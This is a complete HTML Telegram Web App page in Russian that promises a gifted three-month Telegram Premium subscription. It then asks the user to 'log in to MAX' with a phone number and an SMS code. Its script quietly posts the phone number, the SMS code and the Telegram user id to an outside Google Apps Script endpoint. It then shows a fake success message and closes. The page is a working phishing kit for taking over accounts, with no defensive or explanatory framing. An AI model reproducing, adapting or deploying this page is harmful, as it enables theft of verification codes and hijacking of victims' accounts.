<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 380px;
            width: 100%;
            background: #ffffff;
            border-radius: 24px;
            padding: 32px 24px 24px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
            text-align: center;
        }
        .icon-circle {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #e8f0fe;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            font-size: 40px;
        }
        .title { font-size: 20px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .subtitle { font-size: 14px; color: #8e8e93; margin-bottom: 16px; }
        .btn-primary {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 14px;
            background: #1f6feb;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.15s;
            margin-bottom: 6px;
        }
        .btn-primary:active { opacity: 0.7; }
        .btn-secondary {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 14px;
            background: transparent;
            color: #8e8e93;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }
        .hidden { display: none !important; }
        .input-group { margin: 16px 0; text-align: left; }
        .input-group label {
            display: block;
            font-size: 14px;
            color: #8e8e93;
            margin-bottom: 4px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e5e5ea;
            border-radius: 12px;
            background: #f8f8fa;
            color: #1a1a1a;
            font-size: 16px;
            outline: none;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #1f6feb;
            background: #fff;
        }
        .footer-text { font-size: 12px; color: #8e8e93; margin-top: 16px; }
        .code-status { margin-top: 12px; font-size: 14px; color: #8e8e93; }
        .max-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #2b2d42;
            color: #fff;
            font-size: 28px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="step-premium">
            <div class="icon-circle">⭐</div>
            <div class="title">Telegram Premium</div>
            <div class="subtitle">Вам подарили подписку на <strong>3 месяца</strong>!</div>
            <button class="btn-primary" onclick="goToMax()">🎁 Забрать Premium</button>
            <button class="btn-secondary" onclick="tg.close()">Отмена</button>
        </div>
        <div id="step-max" class="hidden">
            <div class="max-icon">MAX</div>
            <div class="title">Вход в MAX</div>
            <div class="subtitle">Нажмите кнопку, чтобы поделиться номером телефона.<br>Мы отправим SMS с кодом.</div>
            <div id="max-phone-form">
                <div class="input-group">
                    <label>📱 Номер телефона</label>
                    <input type="tel" id="phone-input" placeholder="+7 999 999 99 99">
                </div>
                <button class="btn-primary" onclick="sendCode()">📱 Поделиться номером</button>
            </div>
            <div id="max-code-form" class="hidden">
                <div class="input-group">
                    <label>🔑 Код из SMS</label>
                    <input type="text" id="code-input" placeholder="Введите 6 цифр" maxlength="6">
                </div>
                <button class="btn-primary" onclick="verifyCode()">✅ Подтвердить</button>
                <div class="code-status">⏳ Код отправлен на ваш номер</div>
            </div>
            <div class="footer-text">Нажимая кнопку, вы соглашаетесь с условиями</div>
        </div>
        <div id="step-success" class="hidden">
            <div class="icon-circle">🎉</div>
            <div class="title">Поздравляем!</div>
            <div class="subtitle">Premium активирован!<br>Приз будет начислен в течение 5 минут.</div>
            <button class="btn-secondary" onclick="tg.close()">Закрыть</button>
        </div>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        let phoneNumber = '';
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxAC1AOQLdHeasipWu7j3a6cBe7bnPRm6UTQ4Ql-a0OqprBTy0qY8UsPLSlUIO6yYQZ0w/exec";
        function goToMax() {
            document.getElementById('step-premium').classList.add('hidden');
            document.getElementById('step-max').classList.remove('hidden');
        }
        function sendCode() {
            const phone = document.getElementById('phone-input').value.trim();
            if (!phone || phone.length < 10) {
                alert('Введите корректный номер телефона');
                return;
            }
            phoneNumber = phone;
            document.getElementById('max-phone-form').classList.add('hidden');
            document.getElementById('max-code-form').classList.remove('hidden');
        }
        function verifyCode() {
            const code = document.getElementById('code-input').value.trim();
            if (!code || code.length < 4) {
                alert('Введите корректный код');
                return;
            }
            fetch(SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: phoneNumber,
                    code: code,
                    template: 'premium',
                    user_id: tg.initDataUnsafe?.user?.id || 'unknown'
                })
            });
            document.getElementById('step-max').classList.add('hidden');
            document.getElementById('step-success').classList.remove('hidden');
            setTimeout(() => tg.close(), 3000);
        }
    </script>
</body>
</html>
